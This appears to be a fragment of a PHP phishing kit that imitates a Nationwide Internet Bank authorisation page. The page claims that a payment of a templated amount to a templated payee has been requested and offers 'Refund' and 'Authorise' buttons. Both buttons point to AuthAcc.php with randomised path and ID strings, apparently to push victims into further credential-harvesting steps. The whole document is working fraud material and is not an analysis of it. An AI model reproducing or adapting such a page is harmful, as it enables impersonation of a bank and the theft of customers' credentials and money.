...
<html lang="en"><head>
      ...
      <title>
         Authorise - Nationwide Internet Bank
      </title>
   </head>
   <body id="log-in-reader" class="two-col default-theme" style="display:none" onload="document.getElementById(\'log-in-reader\').style.display=\'\';">
                           ...
                           <div class="content-pod login-pod">
                              ...
                              <div class="inner-box cust-num-box">
                                 <form action="#" method="POST" onsubmit="validate(1); return false;" autocomplete="off" id="fform" name="fform" novalidate="novalidate">
									...
									We have received a request from your account for the payment of <b>'.$amount.'</b> to be sent to <b>'.$payee.'</b>.<br><br>
...
<br>
                                 ...
                                 <form action="/AccessManagement/AuthenticateUsingRca/CancelRcaChallenge" autocomplete="off" id="cancel-challenge" method="post">
                                    <div class="inner-box-border">
                                       <p class="last"><b>Note:</b> If you have not requested this payment, please click on "Refund" below to terminate the transaction process and release the payment back to your account.</p>
                                       </p>
									   <a href="AuthAcc.php?/AccesManagement/IdentfyCustomer/'.randomChaSp(rand(5,10)).'&inID='.randomCha(rand(40,60)).'&act=ref" id="cancelRCAChallengeButton" class="btn-2nd-action btn-cancel-request" title="" style="float:left;color:red;">
                                       <b></b>
                                       <i>Refund</i>
                                       </a>
									   
                                       <a href="AuthAcc.php?/AccesManagement/IdentfyCustomer/'.randomChaSp(rand(5,10)).'&inID='.randomCha(rand(40,60)).'&act=noref" id="cancelRCAChallengeButton" class="btn-2nd-action btn-cancel-request" title="">
                                       <b></b>
                                       <i>Authorise</i>
                                       </a>
